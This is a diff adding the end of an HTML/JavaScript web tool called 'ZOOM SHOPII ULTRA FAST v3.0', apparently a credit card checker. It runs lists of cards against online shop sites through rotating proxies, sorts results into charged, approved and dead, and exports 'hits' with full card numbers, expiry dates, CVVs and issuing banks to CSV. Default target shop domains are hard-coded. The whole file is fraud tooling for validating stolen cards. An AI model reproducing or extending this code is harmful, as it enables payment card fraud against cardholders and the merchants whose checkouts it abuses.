+            if (state.sites.length === 0) {
+                alert('❌ No sites available! Upload sites first in Site Manager.');
+                return;
+            }
+            if (state.proxies.length === 0) {
+                alert('❌ No proxies available! Upload proxies first in Proxy Manager.');
+                return;
+            }
+            if (massRunning) {
+                alert('⚠️ Mass check is already running!');
+                return;
+            }
+
+            massRunning = true;
+            massPaused = false;
+            massStopRequested = false;
+            massCardsList = massFileData.lines;
+            massCurrentIndex = 0;
+            massResults = [];
+            
+            document.querySelectorAll('#massFilterContainer .progress-filter-btn').forEach(b => b.classList.remove('active'));
+            document.querySelector('#massFilterContainer .progress-filter-btn.all').classList.add('active');
+            massFilter = 'all';
+            
+            els.massProgress.style.display = 'block';
+            els.massResultsList.innerHTML = '';
+            els.massStatus.textContent = '0%';
+            els.massProgressFill.style.width = '0%';
+            els.massChargedCount.textContent = '0';
+            els.massApprovedCount.textContent = '0';
+            els.massDeadCount.textContent = '0';
+            
+            updateMassUI('running');
+            els.massStatusIndicator.textContent = '🔄 Running';
+            els.massStatusIndicator.className = 'status-indicator running';
+            els.massProgressText.textContent = `0/${massCardsList.length}`;
+            updateMassFilterCounts();
+            
+            logDebug(`🚀 Starting mass check with ${massCardsList.length} cards`, 'info');
+            await processMassCheck();
+        });
+
+        els.massPauseBtn.addEventListener('click', function() {
+            if (massRunning && !massPaused) {
+                massPaused = true;
+                els.massStatusIndicator.textContent = '⏸️ Paused';
+                els.massStatusIndicator.className = 'status-indicator paused';
+                updateMassUI('paused');
+                logDebug('⏸️ Mass check paused', 'warning');
+            }
+        });
+
+        els.massResumeBtn.addEventListener('click', function() {
+            if (massRunning && massPaused) {
+                massPaused = false;
+                els.massStatusIndicator.textContent = '🔄 Running';
+                els.massStatusIndicator.className = 'status-indicator running';
+                updateMassUI('running');
+                logDebug('▶️ Mass check resumed', 'info');
+                processMassCheck();
+            }
+        });
+
+        els.massStopBtn.addEventListener('click', function() {
+            if (massRunning) {
+                massStopRequested = true;
+                massPaused = false;
+                els.massStatusIndicator.textContent = '⏹️ Stopping...';
+                els.massStatusIndicator.className = 'status-indicator stopped';
+                updateMassUI('stopped');
+                logDebug('⏹️ Mass check stopped by user', 'warning');
+            }
+        });
+
+        els.massClearBtn.addEventListener('click', function() {
+            if (massRunning) {
+                if (!confirm('Stop current mass check and clear results?')) return;
+                massStopRequested = true;
+                massPaused = false;
+                massRunning = false;
+            }
+            els.massResultsList.innerHTML = '';
+            els.massProgress.style.display = 'none';
+            els.fileInfo.style.display = 'none';
+            massFileData = null;
+            massResults = [];
+            els.massStartBtn.disabled = true;
+            els.massStartBtn.textContent = '🚀 START MASS CHECK';
+            els.massChargedCount.textContent = '0';
+            els.massApprovedCount.textContent = '0';
+            els.massDeadCount.textContent = '0';
+            els.massProgressText.textContent = '0/0';
+            els.massStatusIndicator.textContent = '⏹️ Stopped';
+            els.massStatusIndicator.className = 'status-indicator stopped';
+            updateMassUI('stopped');
+            updateMassFilterCounts();
+            logDebug('🗑️ Cleared mass results', 'info');
+        });
+
+        // ================================================================
+        // SITE MANAGER
+        // ================================================================
+
+        els.uploadSitesBtn.addEventListener('click', function() {
+            const file = els.siteFileInput.files[0];
+            if (!file) { alert('Please select a .txt file'); return; }
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const urls = e.target.result.split('\n').map(u => u.trim()).filter(u => u);
+                const newSites = urls.map(url => ({
+                    url: url,
+                    status: 'ALIVE',
+                    price: '0.00',
+                    added: new Date().toLocaleDateString()
+                }));
+                state.sites = [...state.sites, ...newSites];
+                state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
+                renderSites();
+                updateStats();
+                logDebug(`🌐 Added ${urls.length} sites`, 'info');
+                alert(`✅ ${urls.length} sites added! Total: ${state.sites.length}`);
+                els.siteFileInput.value = '';
+            };
+            reader.readAsText(file);
+        });
+
+        els.addManualSitesBtn.addEventListener('click', function() {
+            const text = els.manualSites.value;
+            if (!text.trim()) { alert('Please paste some sites'); return; }
+            const urls = text.split('\n').map(u => u.trim()).filter(u => u);
+            const newSites = urls.map(url => ({
+                url: url,
+                status: 'ALIVE',
+                price: '0.00',
+                added: new Date().toLocaleDateString()
+            }));
+            state.sites = [...state.sites, ...newSites];
+            state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
+            renderSites();
+            updateStats();
+            logDebug(`🌐 Added ${urls.length} manual sites`, 'info');
+            alert(`✅ ${urls.length} sites added! Total: ${state.sites.length}`);
+            els.manualSites.value = '';
+        });
+
+        els.checkSitesBtn.addEventListener('click', async function() {
+            if (state.sites.length === 0) { alert('No sites to check!'); return; }
+            if (state.proxies.length === 0) { alert('❌ No proxies available!'); return; }
+
+            this.disabled = true;
+            this.textContent = '⏳ Checking...';
+            els.siteCheckProgress.style.display = 'block';
+
+            const total = state.sites.length;
+            let checked = 0, alive = 0, dead = 0;
+            const aliveSites = [];
+
+            for (const site of state.sites) {
+                const siteUrl = typeof site === 'object' ? site.url : site;
+                const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+                const result = await testSiteWithPrice(siteUrl, proxy);
+                if (result.status === 'alive') {
+                    aliveSites.push({ 
+                        url: siteUrl, 
+                        status: 'ALIVE', 
+                        price: result.price ? result.price.toFixed(2) : '0.00',
+                        added: new Date().toLocaleDateString()
+                    });
+                    alive++;
+                } else {
+                    dead++;
+                }
+                checked++;
+                const pct = Math.round((checked / total) * 100);
+                els.siteCheckStatus.textContent = pct + '%';
+                els.siteCheckFill.style.width = pct + '%';
+                els.siteCheckChecked.textContent = checked;
+                els.siteCheckAlive.textContent = alive;
+                els.siteCheckDead.textContent = dead;
+                els.siteCheckTotal.textContent = total;
+                await new Promise(r => setTimeout(r, 30));
+            }
+
+            state.sites = aliveSites;
+            renderSites();
+            updateStats();
+
+            els.siteCheckStatus.textContent = '✅ Complete!';
+            els.siteCheckFill.style.width = '100%';
+            setTimeout(() => {
+                els.siteCheckProgress.style.display = 'none';
+                els.siteCheckStatus.textContent = '0%';
+                els.siteCheckFill.style.width = '0%';
+            }, 3000);
+
+            this.disabled = false;
+            this.textContent = '🔍 Check & Remove Dead';
+            logDebug(`✅ Site check: ${alive} alive, ${dead} removed`, 'success');
+            alert(`✅ Done! ${alive} sites alive, ${dead} removed.`);
+        });
+
+        els.clearSitesBtn.addEventListener('click', function() {
+            if (state.sites.length === 0) { alert('No sites to clear'); return; }
+            showConfirm('⚠️ Delete All Sites', `Delete all ${state.sites.length} sites?`, function(confirmed) {
+                if (confirmed) {
+                    state.sites = [];
+                    renderSites();
+                    updateStats();
+                    logDebug('🗑️ Cleared all sites', 'info');
+                    alert('✅ All sites cleared!');
+                }
+            });
+        });
+
+        // ================================================================
+        // PROXY MANAGER
+        // ================================================================
+
+        els.uploadProxiesBtn.addEventListener('click', function() {
+            const file = els.proxyFileInput.files[0];
+            if (!file) { alert('Please select a .txt file'); return; }
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const lines = e.target.result.split('\n').map(p => p.trim()).filter(p => p);
+                
+                const validProxies = lines.filter(line => isValidProxy(line));
+                const invalidCount = lines.length - validProxies.length;
+                
+                if (validProxies.length === 0) {
+                    alert('❌ No valid proxies found in file!\n\nSupported formats:\n• user:pass@host:port\n• host:port:user:pass\n• host:port');
+                    return;
+                }
+                
+                if (invalidCount > 0) {
+                    alert(`⚠️ Found ${validProxies.length} valid proxies, ${invalidCount} invalid lines ignored.`);
+                }
+                
+                const newProxies = validProxies.map(proxy => ({
+                    proxy: proxy,
+                    status: 'ALIVE',
+                    latency: 'N/A',
+                    added: new Date().toLocaleDateString()
+                }));
+                state.proxies = [...state.proxies, ...newProxies];
+                state.proxies = [...new Map(state.proxies.map(item => [item.proxy, item])).values()];
+                renderProxies();
+                updateStats();
+                logDebug(`🔌 Added ${validProxies.length} proxies`, 'info');
+                alert(`✅ ${validProxies.length} proxies added! Total: ${state.proxies.length}`);
+                els.proxyFileInput.value = '';
+            };
+            reader.readAsText(file);
+        });
+
+        els.addManualProxiesBtn.addEventListener('click', function() {
+            const text = els.manualProxies.value;
+            if (!text.trim()) { alert('Please paste some proxies'); return; }
+            const lines = text.split('\n').map(p => p.trim()).filter(p => p);
+            
+            const validProxies = lines.filter(line => isValidProxy(line));
+            const invalidCount = lines.length - validProxies.length;
+            
+            if (validProxies.length === 0) {
+                alert('❌ No valid proxies found!\n\nSupported formats:\n• user:pass@host:port\n• host:port:user:pass\n• host:port');
+                return;
+            }
+            
+            if (invalidCount > 0) {
+                alert(`⚠️ Found ${validProxies.length} valid proxies, ${invalidCount} invalid lines ignored.`);
+            }
+            
+            const newProxies = validProxies.map(proxy => ({
+                proxy: proxy,
+                status: 'ALIVE',
+                latency: 'N/A',
+                added: new Date().toLocaleDateString()
+            }));
+            state.proxies = [...state.proxies, ...newProxies];
+            state.proxies = [...new Map(state.proxies.map(item => [item.proxy, item])).values()];
+            renderProxies();
+            updateStats();
+            logDebug(`🔌 Added ${validProxies.length} manual proxies`, 'info');
+            alert(`✅ ${validProxies.length} proxies added! Total: ${state.proxies.length}`);
+            els.manualProxies.value = '';
+        });
+
+        els.checkProxiesBtn.addEventListener('click', async function() {
+            if (state.proxies.length === 0) { alert('No proxies to check!'); return; }
+
+            this.disabled = true;
+            this.textContent = '⏳ Checking...';
+            els.proxyCheckProgress.style.display = 'block';
+
+            const total = state.proxies.length;
+            let checked = 0, alive = 0, dead = 0;
+            const aliveProxies = [];
+
+            for (const proxy of state.proxies) {
+                const proxyStr = typeof proxy === 'object' ? proxy.proxy : proxy;
+                const result = await testProxy(proxyStr);
+                if (result.status === 'alive') {
+                    aliveProxies.push({
+                        proxy: proxyStr,
+                        status: 'ALIVE',
+                        latency: 'N/A',
+                        added: new Date().toLocaleDateString()
+                    });
+                    alive++;
+                } else {
+                    dead++;
+                }
+                checked++;
+                const pct = Math.round((checked / total) * 100);
+                els.proxyCheckStatus.textContent = pct + '%';
+                els.proxyCheckFill.style.width = pct + '%';
+                els.proxyCheckChecked.textContent = checked;
+                els.proxyCheckAlive.textContent = alive;
+                els.proxyCheckDead.textContent = dead;
+                els.proxyCheckTotal.textContent = total;
+                await new Promise(r => setTimeout(r, 30));
+            }
+
+            state.proxies = aliveProxies;
+            renderProxies();
+            updateStats();
+
+            els.proxyCheckStatus.textContent = '✅ Complete!';
+            els.proxyCheckFill.style.width = '100%';
+            setTimeout(() => {
+                els.proxyCheckProgress.style.display = 'none';
+                els.proxyCheckStatus.textContent = '0%';
+                els.proxyCheckFill.style.width = '0%';
+            }, 3000);
+
+            this.disabled = false;
+            this.textContent = '🔍 Check & Remove Dead';
+            logDebug(`✅ Proxy check: ${alive} alive, ${dead} removed`, 'success');
+            alert(`✅ Done! ${alive} proxies alive, ${dead} removed.`);
+        });
+
+        els.clearProxiesBtn.addEventListener('click', function() {
+            if (state.proxies.length === 0) { alert('No proxies to clear'); return; }
+            showConfirm('⚠️ Delete All Proxies', `Delete all ${state.proxies.length} proxies?`, function(confirmed) {
+                if (confirmed) {
+                    state.proxies = [];
+                    renderProxies();
+                    updateStats();
+                    logDebug('🗑️ Cleared all proxies', 'info');
+                    alert('✅ All proxies cleared!');
+                }
+            });
+        });
+
+        // ================================================================
+        // HITS
+        // ================================================================
+        els.refreshHitsBtn.addEventListener('click', function() {
+            renderFullHitsList();
+            renderHits();
+            logDebug('🔄 Refreshed hits', 'info');
+        });
+
+        els.exportHitsBtn.addEventListener('click', function() {
+            if (state.hits.length === 0) { alert('No hits to export'); return; }
+            let csv = 'Card,Exp,CVV,Amount,Status,Time,Type,Date,Gateway,Price,Bank,Country,Brand,CardType,Level,ResponseType\n';
+            state.hits.forEach(h => {
+                csv += `${h.fullCard || h.card},${h.exp || ''},${h.cvv || ''},${h.amount || 0},${h.status || ''},${h.time || ''},${h.type || ''},${h.date || ''},${h.gateway || ''},${h.price || ''},${h.bank || ''},${h.country || ''},${h.brand || ''},${h.cardType || ''},${h.cardLevel || ''},${h.responseType || ''}\n`;
+            });
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'hits_' + new Date().toISOString().slice(0, 10) + '.csv';
+            a.click();
+            URL.revokeObjectURL(url);
+            logDebug(`📥 Exported ${state.hits.length} hits to CSV`, 'info');
+        });
+
+        els.clearHitsBtn.addEventListener('click', function() {
+            if (state.hits.length === 0) { alert('No hits to clear'); return; }
+            showConfirm('⚠️ Delete All Hits', `Delete all ${state.hits.length} hits?`, function(confirmed) {
+                if (confirmed) {
+                    state.hits = [];
+                    state.charged = 0;
+                    state.approved = 0;
+                    state.totalHits = 0;
+                    state.declined = 0;
+                    updateStats();
+                    renderHits();
+                    renderFullHitsList();
+                    logDebug('🗑️ Cleared all hits', 'info');
+                    alert('✅ All hits cleared!');
+                }
+            });
+        });
+
+        // ================================================================
+        // INIT
+        // ================================================================
+        loadState();
+
+        // Add default sites if none exist
+        if (state.sites.length === 0) {
+            state.sites = [
+                { url: 'slaterocks.com', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() },
+                { url: 'mlmm.de', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() },
+                { url: 'elgranel.com', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() }
+            ];
+            logDebug('🌐 Added default test sites', 'info');
+        }
+
+        // Add default proxy if none exist
+        if (state.proxies.length === 0) {
+            state.proxies = [{
+                proxy: CONFIG.DEFAULT_PROXY,
+                status: 'ALIVE',
+                latency: 'N/A',
+                added: new Date().toLocaleDateString()
+            }];
+            logDebug('🔌 Added default proxy', 'info');
+        }
+
+        renderSites();
+        renderProxies();
+        renderHits();
+        renderFullHitsList();
+        updateStats();
+
+        logDebug('🚀 ZOOM SHOPII ULTRA FAST v3.0 FIXED!', 'success');
+        logDebug(`📡 API: ${CONFIG.API_SERVERS[0]}`, 'info');
+        logDebug(`🔑 API Key: ${CONFIG.CHECKER_API_KEY}`, 'info');
+        logDebug(`🔌 Default Proxy: ${CONFIG.DEFAULT_PROXY.substring(0, 30)}...`, 'info');
+        logDebug(`✅ Fixed: site.startsWith error handled`, 'success');
+
+        // Show debug by default
+        toggleDebug();
+
+        console.log('🚀 ZOOM SHOPII ULTRA FAST v3.0 FIXED');
+        console.log('📊 State:', state);
+        console.log('🌐 Sites:', state.sites.length);
+        console.log('🔌 Proxies:', state.proxies.length);
+        console.log('🎯 Hits:', state.hits.length);
+        console.log('✅ site.startsWith FIXED!');
+    </script>
+
+</body>
+</html>
